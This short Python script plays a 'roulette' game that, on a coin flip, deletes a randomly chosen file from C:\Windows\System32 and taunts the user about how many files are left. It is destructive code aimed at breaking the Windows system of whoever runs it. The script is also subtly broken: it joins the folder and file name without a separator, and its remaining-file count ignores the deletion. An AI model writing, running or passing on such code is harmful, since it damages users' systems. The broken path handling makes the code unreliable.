import os
import random

targets = os.listdir(r"C:\Windows\System32")
random_file = random.choice(targets)


if random.randint(0, 1) == 0:
    os.remove(r"C:\Windows\System32" + random_file)

    print(f'Ouch, {random_file}, was deleted')
    print(f'Don\'t be upset, {len(targets)} files left, you still have chances to win.')
else:
    print("Look at this lucky face! \nCongratulations, You Won!")
